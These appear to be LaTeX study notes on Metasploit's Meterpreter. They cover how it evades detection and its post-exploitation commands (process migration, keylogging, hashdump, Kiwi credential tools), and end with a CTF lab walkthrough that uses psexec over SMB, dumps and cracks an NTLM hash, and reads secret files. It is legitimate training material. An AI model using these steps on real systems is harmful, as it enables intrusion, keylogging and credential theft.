\subsubsection*{Metasploit: Meterpreter}
\label{subsubsec:Metasploit_Meterpreter}
\addcontentsline{toc}{subsubsection}{Metasploit: Meterpreter}
\T{Introduction}{
In this module, we will learn how Meterpreter, the feature we used before as prompt in target systems and for post exploitation to get hashdumps, works in a more detailed way.\\
Meterpreter is a Metasploit payload that runs on the target system and acts as an agent within a command and control architecture. Through Meterpreter the attacker will interact with the target system and files, as well as be able to use Meterpreter's commands. \\

Meterpreter need not be in the target system's disk, but runs on the RAM of the system, hence being much more dificult to detect for non specialized detection systems, as every such system will scan for new files on the disk.\\
Furthermore, it tries to avoid IPS (Intrusion Prevention Systems) and IDS (Intrusion Detection Systems) using encrypted communication with the running server, commonly the attacking machine. This way, the defending system woud need to decrypt and inspect all encrypted traffic to be aware of this intrusion. \\
Still, it is noteworthy that most of the standard antiviruses do recognize Meterpreter running on the system by other methods.\\
Note as well that Meterpreter sets up a TLS encrypted communication channel with the attacking system.\\

This way, the identification for Meterpreter is only a \cd{pid} we can learn from the Meterpreter shell with the \cd{getpid} command. When looking at the processes running on the target system, it will logically not show up as Meterpreter, but under another name, e.g spoolsv.exe (as in the example shown).\\
It further masks DLLs (Dynamic-Link libraries) used by its process, so that any detailed inspection does not arise any further suspicions.\\

The detection of Meterpreter will not be dealed with here, but rather its use.
}
\T{Meterpreter Flavours}{
We recall from previous modules the different types of payloads Metasploit provides: single or inline and staged payloads. These latter are sent in two parts: the stager gets sent and installed first, which later requests the rest of the payload, allowing for a smaller initial payload size.\\

To see which Meterpreter payloads we have at our disposal, we best list them all with \cd{msfvenom --list payloads} and then grep the ones dealing with Meterpreter interaction, hence giving us the full command:
\cdnl{msfvenom --list payloads | grep meterpreter}
From there we can then select the best suited version for our target, depending on:
\begin{itemize}
\item Operating system, e.g Linux, Windows, Mac, Android, etc.
\item Components on the target system, e.g Pyhon, PHP, etc.
\item Network connection types allowed by the target system, e.g raw TCP, HTTPS, IPv6 vs IPv4 differently monitored, etc.
\end{itemize}
Once we select the exploit, we can sometimes configure a more specific payload compatible with it that suits our goals better via \cd{show payloads}.\\
Others have a default Meterpreter payload, among them some standalone payloads that are so configured. 
}
\T{Meterpreter Commands}{
From within the meterpreter prompt, one can see all available commands running \cd{help}. Depending on the tools it runs it will enlarge or shrink the list it displays.\\
It shows primarily three categories of commands: Built-ins commands, Meterpreter tools and Meterpreter scripting, listed under the following command categories (for the Windows version of Meterpreter): 
\begin{itemize}
\item Core commands: to navigate and interact the target system.
\item File system commands: to access, alter and generally interact with files and directories.
\item Networking commands: to access network information and alter its traffic.
\item System commands: to run standard commands, view and alter processes and interact with the system.
\item User Interface commands
\item Webcam commands
\item Audio output
\item Elevate
\item Password database
\item Timestomp
\end{itemize}
The rest of the listed commands are meant to access the audio or video setup, access information about other characteristics of the system, elevate privileges and dump password hashes.
}
\T{Post-Exploitation with Meterpreter}{
A short list of the most commonly used and useful commands of Meterpreter is dealt with in this Task:\\
\begin{itemize}
\item \textbf{\cd{help}}: lists all available commands in Meterpreter. As these vary depending on the version and features enabled, it is very useful to run it first to get a mind map of the available tools.
\item \textbf{\cd{getuid}}: shows the current user Meterpreter is running under, similar to \cd{whoami}. This way we can get an idea of the privilege level we have access to.
\item  \cd{\textbf{ps}}: lists running processes with PID, allowing to migrate Meterpreter to another process.
\item \cd{\textbf{migrate}}: migrates the Meterpreter to another process so it can interact with it, e.g with word.exe or notepad.exe to log the keystrokes with the eventually present commands \cd{keyscan\_start, keyscan\_stop} and \cd{keyscan\_dump}.\\
 The migration syntax is \cd{migrate <target PID>}.\\
 Note that the privileges of the previous process might get lost if we switch to process run by a lower privileged user.
 \item \cd{\textbf{hashdump}}: lists the contents of the SAM (Security Account Manager) database, where users and their passwords' NTLM hashes are stored.
 \item \cd{\textbf{search}}: similar to the \cd{find} command on Linux, it looks for files or directories with certain names, both useful for CTF contexts and actual pentesting engagements.
 \item \cd{\textbf{shell}}: launches a regular shell on the target system. Undoable with \cd{Ctrl + Z}.
\end{itemize}
}
\T{Post-Exploitation Challenge}{
In this task we will need to access the vulnerable target machine making use of Metasploit and Meterpreter to run post-exploitation modules.\\
We can also load additional tools such as Python or Kiwi, a framework allowing for credential retrieval tools to run on the target system, with the syntax \cd{load <tool>}. Remember to run the \cd{help} command to learn all new features loaded with such frameworks.\\
As a general guide, we will want to:
\begin{enumerate}
\item Gather as much information about the target system as possible.
\item Look for sensitive files and information.
\item Move both laterally and vertically.
\item Escalate privileges.
\end{enumerate}
For the first foothold over SMB we can use the credentials \cd{\textbf{ballen:Password1}}.\\
As a general procedure we act as follows:
\begin{enumerate}
\item We launch the Metasploit console with \cd{msfconsole}
\item We get a Meterpreter shell on the target using an smb exploitation module as suggested:
	\begin{enumerate}
	\item We select to \cd{use} the module \cd{exploit/windows/smb/psexec}
	\item We set the relevant parameters: LHOST, RHOST, LPORT, SMBPass and SMBUser.
	\item We run the module. 
	\end{enumerate} 
\item We get the system information with the \cd{sysinfo} command.\\
That way, we see the system's name \cd{ACME-TEST} and the domain \cd{FLASH}.
\item We see (enumerate) all shares to answer the next question:
	\begin{enumerate}
	\item We background the session using \cd{Ctrl+Z}.
	\item We find \cd{windows/gather/enum\_shares} after a \cd{search smb shares}
	\item We set the SESSION parameter to the backgrounded session-nr
	\item We run the module
	\end{enumerate}
	That way we see the standard shares \cd{SYSVOL} and \cd{NETLOGON} as well as the nonstandard \cd{\textbf{speedster}}, which will be the answer we look for.
\item Using the native \cd{hashdump} command, we see all users and credentials, and get from the corresponding line:\\
\cdnl{jchambers:1114:aad3b435b51404eeaad3b435b51404ee:\\
69596c7aa1e8daee17f8e78870e25a5c:::} the hash \cd{69596c7aa1e8daee17f8e78870e25a5c}
\item We pass this hash to \href{https://crackstation.net/}{CrackStation} and see the plaintext password \textbf{Trustno1}.
\item We switch from the folder we landed in (\cd{C:/Windows/system32}) to the main drive and run a search for the secret files with \cd{search -f *secret*}
\item We see the ``secrets.txt'' file in the location \textbf{\cd{C:/Program Files (x86)/Windows Multimedia Platform/secrets.txt}}
\item We print the contents with \cd{cat <PATH>/secrets.txt} file and read the password \cd{\textbf{KDSvbsw3849!}}
\item We read the path to the \cd{realsecret.txt} file from the above \cd{*secret*} search: \cd{c:/inetpub/wwwroot/realsecret.txt}
\item We read the real secret with \cd{cat <PATH>/realsecret.txt}: ``The Flash is the fastest man alive''
\end{enumerate}
}